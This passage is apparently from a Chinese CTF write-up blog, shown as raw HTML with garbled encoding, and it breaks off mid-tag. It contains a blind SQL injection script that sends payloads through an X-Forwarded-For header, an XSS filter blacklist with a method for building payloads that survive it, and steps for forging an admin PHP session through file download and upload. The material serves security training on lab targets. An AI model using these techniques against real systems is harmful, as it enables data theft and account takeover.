class="hljs-string">&#x27;111&#x27;</span><br>        headers = &#123;<br>                    <span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&#x27;track_uuid=6e17fe5e-140c-4138-dea6-d197aa6214e3&#x27;</span>,<br>                    <span class="hljs-string">&#x27;X-Forwarded-For&#x27;</span>: payload<br>                    &#125;<br>        r = requests.post(url = url, headers = headers)<br> <br> <br>        <span class="hljs-keyword">if</span> r.status_code == <span class="hljs-number">429</span>:<span class="hljs-comment">#buuç‰¹è‰²</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;too fast&#x27;</span>)<br>            time.sleep(<span class="hljs-number">2</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Last Ip: 1&#x27;</span>  <span class="hljs-keyword">in</span> r.text:<span class="hljs-comment">#payloadè¯­å¥ç”¨çš„éƒ½æ˜¯å¤§äºï¼Œå¦‚æœå¤§äºä¸­å€¼ï¼Œåˆ™ä¸­å€¼åŠ ä¸€èµ‹ç»™æœ€å°å€¼</span><br>            left = mid + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;Last Ip: 1&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> r.text:<span class="hljs-comment">#ä¸å°äºåˆ™ä¸­å€¼ç»™æœ€å¤§å€¼</span><br>            right = mid<br>        mid = left + ((right-left)&gt;&gt;<span class="hljs-number">1</span>)<span class="hljs-comment">#å³ç§»1ï¼Œä»£è¡¨é™¤2 å¯ä»¥ç›´æ¥mid=ï¼ˆleft +rightï¼‰//2</span><br>    <span class="hljs-keyword">if</span> mid == <span class="hljs-number">31</span> <span class="hljs-keyword">or</span> mid == <span class="hljs-number">127</span>:<br>        <span class="hljs-keyword">break</span><br>    res += <span class="hljs-built_in">chr</span>(mid)<span class="hljs-comment">#chrå‡½æ•°ã€‚asciiè½¬åŒ–ä¸ºå­—ç¬¦</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(mid),res)<br>    time.sleep(<span class="hljs-number">1</span>)<br><span class="hljs-comment"># information_schema,ctftraining,mysql,performance_schema,test,ctf,F4l9_D4t4B45e</span><br><span class="hljs-comment">#F4l9_t4b1e</span><br><span class="hljs-comment">#F4l9_C01uMn</span><br></code></pre></td></tr></table></figure><h2 id="GWCTF-2019-mypassword-ç¯å¢ƒæœ‰é—®é¢˜ï¼Œç•™ç€"><a href="#GWCTF-2019-mypassword-ç¯å¢ƒæœ‰é—®é¢˜ï¼Œç•™ç€" class="headerlink" title="[GWCTF 2019]mypassword(ç¯å¢ƒæœ‰é—®é¢˜ï¼Œç•™ç€)"></a>[GWCTF 2019]mypassword(ç¯å¢ƒæœ‰é—®é¢˜ï¼Œç•™ç€)</h2><p>login.js:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">if</span> (<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> &amp;&amp; <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> != <span class="hljs-string">&#x27;&#x27;</span>) &#123;<br><span class="hljs-keyword">var</span> cookies = <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;; &#x27;</span>);<br><span class="hljs-keyword">var</span> cookie = &#123;&#125;;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; cookies.<span class="hljs-property">length</span>; i++) &#123;<br><span class="hljs-keyword">var</span> arr = cookies[i].<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;=&#x27;</span>);<br><span class="hljs-keyword">var</span> key = arr[<span class="hljs-number">0</span>];<br>cookie[key] = arr[<span class="hljs-number">1</span>];<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_">typeof</span>(cookie[<span class="hljs-string">&#x27;user&#x27;</span>]) != <span class="hljs-string">&quot;undefined&quot;</span> &amp;&amp; <span class="hljs-title function_">typeof</span>(cookie[<span class="hljs-string">&#x27;psw&#x27;</span>]) != <span class="hljs-string">&quot;undefined&quot;</span>)&#123;<br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByName</span>(<span class="hljs-string">&quot;username&quot;</span>)[<span class="hljs-number">0</span>].<span class="hljs-property">value</span> = cookie[<span class="hljs-string">&#x27;user&#x27;</span>];<br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByName</span>(<span class="hljs-string">&quot;password&quot;</span>)[<span class="hljs-number">0</span>].<span class="hljs-property">value</span> = cookie[<span class="hljs-string">&#x27;psw&#x27;</span>];<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¤§è‡´å°±æ˜¯åˆ©ç”¨<code>cookie</code>ä¼ é€’ç”¨æˆ·åå’Œå¯†ç ï¼š</p><p>![GWCTF 2019mypassword2](img&#x2F;GWCTF 2019mypassword2.png)</p><p>å­˜åœ¨<code>register.php</code>ï¼Œéšä¾¿æ³¨å†Œä¸€ä¸ªç™»å½•ï¼š</p><p>![GWCTF 2019mypassword1](img&#x2F;GWCTF 2019mypassword1.png)</p><p>ç¯å¢ƒæœ‰é—®é¢˜ã€‚ã€‚è¿™ä¸ªé¡µé¢åº”è¯¥è¿˜æœ‰<code>feedback,list,logout</code>è¿™äº›åŠŸèƒ½ä½†æˆ‘é‡å¯äº†å¥½å‡ æ¬¡è¿˜æ˜¯è¿™åŠæ ·ï¼Œå—çš„ã€‚</p><p><code>feedback.php</code>å³é”®å­˜åœ¨æ³¨é‡Šï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$feedback</span>))&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;åé¦ˆä¸åˆæ³•&#x27;);&lt;/script&gt;&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&amp;&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;#&#x27;</span>,<span class="hljs-string">&#x27;%&#x27;</span>,<span class="hljs-string">&#x27;input&#x27;</span>,<span class="hljs-string">&#x27;script&#x27;</span>,<span class="hljs-string">&#x27;iframe&#x27;</span>,<span class="hljs-string">&#x27;host&#x27;</span>,<span class="hljs-string">&#x27;onload&#x27;</span>,<span class="hljs-string">&#x27;onerror&#x27;</span>,<span class="hljs-string">&#x27;srcdoc&#x27;</span>,<span class="hljs-string">&#x27;location&#x27;</span>,<span class="hljs-string">&#x27;svg&#x27;</span>,<span class="hljs-string">&#x27;form&#x27;</span>,<span class="hljs-string">&#x27;img&#x27;</span>,<span class="hljs-string">&#x27;src&#x27;</span>,<span class="hljs-string">&#x27;getElement&#x27;</span>,<span class="hljs-string">&#x27;document&#x27;</span>,<span class="hljs-string">&#x27;cookie&#x27;</span>];<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$val</span>) &#123;<br>        <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$feedback</span>,<span class="hljs-variable">$val</span>) !== <span class="hljs-literal">false</span>)&#123;<br>                <span class="hljs-variable">$feedback</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-variable">$val</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$feedback</span>);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>ç®€å•æ›¿æ¢è¿‡æ»¤ï¼Œç›´æ¥æŠŠå…³é”®å­—æ›¿æ¢æˆç©ºäº†ã€‚<code>foreach</code>å‡½æ•°ä¼šéå†æ¯ä¸ªå…³é”®å­—ï¼Œç„¶åå¦‚æœè¯­å¥ä¸­å­˜åœ¨å¯¹åº”å…³é”®å­—å°±æ¢æˆç©ºã€‚æ¯”å¦‚å¯ä»¥é€šè¿‡æ„é€ <code>scriphostt</code>è¿™ç§æ¥æ„é€ æˆ‘ä»¬éœ€è¦çš„<code>payload</code>ã€‚</p><p>è¿™é‡Œæˆ‘çœ‹æœ‰äº›å¸ˆå‚…è¯´<code>cookie</code>æ”¾åœ¨æœ€åäº†æ‰€ä»¥ä¸èƒ½é€šè¿‡æ„é€ <code>coocookiekie</code>è¿™ç§å»æ‹¼ã€‚ã€‚ä¸çŸ¥é“ä¸ºå•¥ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$feedback</span> = <span class="hljs-string">&#x27;coocookiekie&#x27;</span>;<br><span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&amp;&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;#&#x27;</span>,<span class="hljs-string">&#x27;%&#x27;</span>,<span class="hljs-string">&#x27;input&#x27;</span>,<span class="hljs-string">&#x27;script&#x27;</span>,<span class="hljs-string">&#x27;iframe&#x27;</span>,<span class="hljs-string">&#x27;host&#x27;</span>,<span class="hljs-string">&#x27;onload&#x27;</span>,<span class="hljs-string">&#x27;onerror&#x27;</span>,<span class="hljs-string">&#x27;srcdoc&#x27;</span>,<span class="hljs-string">&#x27;location&#x27;</span>,<span class="hljs-string">&#x27;svg&#x27;</span>,<span class="hljs-string">&#x27;form&#x27;</span>,<span class="hljs-string">&#x27;img&#x27;</span>,<span class="hljs-string">&#x27;src&#x27;</span>,<span class="hljs-string">&#x27;getElement&#x27;</span>,<span class="hljs-string">&#x27;document&#x27;</span>,<span class="hljs-string">&#x27;cookie&#x27;</span>];<br><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$val</span>) &#123;<br>    <span class="hljs-variable">$feedback</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-variable">$val</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$feedback</span>);<br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$feedback</span>; <span class="hljs-comment">// è¾“å‡ºï¼š&#x27;cookie&#x27;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>2024.1.12 è¿™é¢˜ç¯å¢ƒæœ‰é—®é¢˜åšä¸äº†ï¼Œç›´æ¥çœ‹<code>wp</code>çš„è¯å’Œæ²¡åšä¸€æ ·ï¼Œç•™ç€åé¢çœ‹çœ‹èƒ½ä¸èƒ½åšå§</strong></p><h2 id="HFCTF2020-BabyUpload"><a href="#HFCTF2020-BabyUpload" class="headerlink" title="[HFCTF2020]BabyUpload"></a>[HFCTF2020]BabyUpload</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">session_save_path</span>(<span class="hljs-string">&quot;/var/babyctf/&quot;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&quot;/flag&quot;</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] ===<span class="hljs-string">&#x27;admin&#x27;</span>)<br>&#123;<br>    <span class="hljs-variable">$filename</span>=<span class="hljs-string">&#x27;/var/babyctf/success.txt&#x27;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>))&#123;<br>            <span class="hljs-title function_ invoke__">safe_delete</span>(<span class="hljs-variable">$filename</span>);<br>            <span class="hljs-keyword">die</span>(<span class="hljs-variable">$flag</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] =<span class="hljs-string">&#x27;guest&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$direction</span> = <span class="hljs-title function_ invoke__">filter_input</span>(INPUT_POST, <span class="hljs-string">&#x27;direction&#x27;</span>); <span class="hljs-comment">#filter_inputå‡½æ•°ç”¨äºè·å–postä¼ é€’çš„å¯¹åº”å‚æ•°çš„å€¼</span><br><span class="hljs-variable">$attr</span> = <span class="hljs-title function_ invoke__">filter_input</span>(INPUT_POST, <span class="hljs-string">&#x27;attr&#x27;</span>);<br><span class="hljs-variable">$dir_path</span> = <span class="hljs-string">&quot;/var/babyctf/&quot;</span>.<span class="hljs-variable">$attr</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$attr</span>===<span class="hljs-string">&quot;private&quot;</span>)&#123;<br>    <span class="hljs-variable">$dir_path</span> .= <span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<span class="hljs-comment">#åœ¨dir_pathåè¿½åŠ /ä¼šè¯ç”¨æˆ·åï¼Œ/var/babyctf/private/$_SESSION[&#x27;username&#x27;]</span><br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$direction</span> === <span class="hljs-string">&quot;upload&quot;</span>)&#123;<br>    <span class="hljs-keyword">try</span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;up_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]))&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">RuntimeException</span>(<span class="hljs-string">&#x27;invalid upload&#x27;</span>);<br>        &#125;<br>        <span class="hljs-variable">$file_path</span> = <span class="hljs-variable">$dir_path</span>.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;up_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>        <span class="hljs-variable">$file_path</span> .= <span class="hljs-string">&quot;_&quot;</span>.<span class="hljs-title function_ invoke__">hash_file</span>(<span class="hljs-string">&quot;sha256&quot;</span>,<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;up_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/(\.\.\/|\.\.\\\\)/&#x27;</span>, <span class="hljs-variable">$file_path</span>))&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">RuntimeException</span>(<span class="hljs-string">&#x27;invalid file path&#x27;</span>);<br>        &#125;<br>        @<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$dir_path</span>, <span class="hljs-number">0700</span>, <span class="hljs-literal">TRUE</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;up_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>],<span class="hljs-variable">$file_path</span>))&#123;<br>            <span class="hljs-variable">$upload_result</span> = <span class="hljs-string">&quot;uploaded&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">RuntimeException</span>(<span class="hljs-string">&#x27;error while saving&#x27;</span>);<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">RuntimeException</span> <span class="hljs-variable">$e</span>) &#123;<br>        <span class="hljs-variable">$upload_result</span> = <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>();<br>    &#125;<br> <span class="hljs-comment">//ä¸Šé¢éƒ¨åˆ†ä¸ºä¸Šä¼ åŠŸèƒ½ï¼Œä¸‹é¢éƒ¨åˆ†åŒ…æ‹¬ä¸‹è½½åŠŸèƒ½</span><br>&#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$direction</span> === <span class="hljs-string">&quot;download&quot;</span>) &#123;<br>    <span class="hljs-keyword">try</span>&#123;<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-title function_ invoke__">filter_input</span>(INPUT_POST, <span class="hljs-string">&#x27;filename&#x27;</span>));<br>        <span class="hljs-variable">$file_path</span> = <span class="hljs-variable">$dir_path</span>.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$filename</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/(\.\.\/|\.\.\\\\)/&#x27;</span>, <span class="hljs-variable">$file_path</span>))&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">RuntimeException</span>(<span class="hljs-string">&#x27;invalid file path&#x27;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$file_path</span>)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">RuntimeException</span>(<span class="hljs-string">&#x27;file not exist&#x27;</span>);<br>        &#125;<br>        <br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: application/force-download&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Length: &#x27;</span>.<span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$file_path</span>));<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Disposition: attachment; filename=&quot;&#x27;</span>.<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">65</span>).<span class="hljs-string">&#x27;&quot;&#x27;</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$file_path</span>))&#123;<br>            <span class="hljs-variable">$download_result</span> = <span class="hljs-string">&quot;downloaded&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">RuntimeException</span>(<span class="hljs-string">&#x27;error while saving&#x27;</span>);<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">RuntimeException</span> <span class="hljs-variable">$e</span>) &#123;<br>        <span class="hljs-variable">$download_result</span> = <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>();<br>    &#125;<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æ–‡ä»¶ä¸Šä¼ +æ–‡ä»¶ä¸‹è½½åŠŸèƒ½ï¼Œé€šè¿‡<code>POST</code>ä¼ é€’ä¸‰ä¸ªå‚æ•°ï¼š<code>direction</code>ï¼Œ<code>attr</code>ï¼Œ<code>filename</code>(ç¬¬ä¸‰ä¸ªå‚æ•°åªæœ‰æ–‡ä»¶ä¸‹è½½çš„æ—¶å€™æ‰èƒ½ç”¨åˆ°)ã€‚<code>direction</code>è¿™ä¸œè¥¿å°±æ˜¯ç”¨æ¥è¡¨ç¤ºåŠŸèƒ½çš„ï¼š<code>upload</code>æˆ–è€…<code>download</code>åŠŸèƒ½ã€‚<code>attr</code>å’Œæ–‡ä»¶è·¯å¾„æœ‰å…³ç³»ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$attr</span>===<span class="hljs-string">&quot;private&quot;</span>)&#123;<br>    <span class="hljs-variable">$dir_path</span> .= <span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<span class="hljs-comment">#åœ¨dir_pathåè¿½åŠ /ä¼šè¯ç”¨æˆ·å</span><br>&#125;<br></code></pre></td></tr></table></figure><p>ç›®æµ‹å¯ä»¥ç”¨è¿™ä¸ªå»çœ‹<code>username</code>å­—æ®µæ˜¯å¤šå°‘</p><p><code>filename</code>å°±æ˜¯ä¸‹è½½æ–‡ä»¶æ—¶çš„ç”¨æˆ·åã€‚ä¸è¿‡ä¸‹è½½æ–‡ä»¶æ—¶banäº†<code>../</code>å’Œ<code>..\</code>ï¼Œæ„Ÿè§‰ä¸èƒ½ç›®å½•ç©¿è¶Šä¸‹è½½ä»»æ„æ–‡ä»¶äº†ã€‚ã€‚</p><p>çœ‹ä¸‹å¦‚ä½•è·å–<code>flag</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] ===<span class="hljs-string">&#x27;admin&#x27;</span>)<br>&#123;<br>    <span class="hljs-variable">$filename</span>=<span class="hljs-string">&#x27;/var/babyctf/success.txt&#x27;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>))&#123;<br>            <span class="hljs-title function_ invoke__">safe_delete</span>(<span class="hljs-variable">$filename</span>);<br>            <span class="hljs-keyword">die</span>(<span class="hljs-variable">$flag</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] =<span class="hljs-string">&#x27;guest&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç›®æµ‹è¦é€šè¿‡<code>session</code>ä¼ªé€ <code>admin</code>ç”¨æˆ·ç„¶åä¸Šä¼ <code>success.txt</code>åˆ°ç›®æ ‡è·¯å¾„ä¸‹ã€‚ä½†è¿™é‡Œæœ‰ä¸¤ä¸ªé—®é¢˜ï¼š</p><p>1.$_SESSION[â€˜usernameâ€™] &#x3D;&#x3D;&#x3D;â€™adminâ€™æ€ä¹ˆæ»¡è¶³</p><p>2.&#x2F;var&#x2F;babyctf&#x2F;success.txtè¿™ä¸œè¥¿å¦‚ä½•ä¸Šä¼ ã€‚</p><p>å…ˆå°è¯•ä¸‹è½½<code>session</code>æ–‡ä»¶ï¼š</p><blockquote><p>phpçš„sessioné»˜è®¤å­˜å‚¨æ–‡ä»¶åæ˜¯sess_+PHPSESSIDçš„å€¼</p></blockquote><p>ç„¶åï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">session_save_path</span>(<span class="hljs-string">&quot;/var/babyctf/&quot;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬æŠŠ<code>attr</code>ç½®ç©ºï¼Œç„¶åç›´æ¥<code>direction=download</code>è½¬åˆ°æ–‡ä»¶ä¸‹è½½ï¼Œ<code>filename=sess_7d764e03dc4cc7fff5efc9efb063f9b8</code>ä¸‹è½½å¯¹åº”æ–‡ä»¶çœ‹çœ‹æ˜¯å¦èƒ½æˆåŠŸï¼š</p><p><img src="/img/1HFCTF2020BabyUpload.png" alt="1HFCTF2020BabyUpload"></p><p>ç„¶åæ˜¯ä¸€äº›åœ¨<code>php</code>ä¸­<code>session</code>ååºåˆ—åŒ–çš„ä¸€äº›çŸ¥è¯†ï¼š</p><p><a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/">å‚è€ƒèµ„æ–™</a></p><blockquote><p>sessionä¸­çš„å†…å®¹å¹¶ä¸æ˜¯æ”¾åœ¨å†…å­˜ä¸­çš„ï¼Œè€Œæ˜¯é»˜è®¤ä»¥æ–‡ä»¶çš„æ–¹å¼æ¥å­˜å‚¨çš„ï¼Œå¯ç”±é…ç½®é¡¹session.save_handleræ¥è¿›è¡Œç¡®å®šã€‚å­˜å‚¨çš„æ–‡ä»¶æ˜¯ä»¥sess_sessionidæ¥è¿›è¡Œå‘½åçš„ï¼Œæ–‡ä»¶çš„å†…å®¹å°±æ˜¯sessionå€¼çš„åºåˆ—åŒ–ä¹‹åçš„å†…å®¹ã€‚</p></blockquote><p>ä¸»è¦æ³¨æ„è¿™ä¸ª<code>php_binary</code>å¼•æ“ï¼š</p><blockquote><p>php_binaryå¼•æ“:é”®åçš„é•¿åº¦å¯¹åº”çš„asciiå­—ç¬¦+é”®å+ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–åçš„å€¼</p></blockquote><p>å…ˆç”Ÿæˆç›®æ ‡<code>session</code>æ–‡ä»¶ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php_binary&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_save_path</span>(<span class="hljs-string">&quot;D:\\phpstudy_pro\\WWW\\localhost&quot;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&#x27;admin&#x27;</span>;<br></code></pre></td></tr></table></figure><p><img src="/img/2HFCTF2020BabyUpload.png" alt="2HFCTF2020BabyUpload"></p><p>æœ‰äº†ç›®æ ‡æ–‡ä»¶ç„¶åå°±è¦ä¸Šä¼ å®ƒï¼Œæ³¨æ„è¿™æ®µï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span 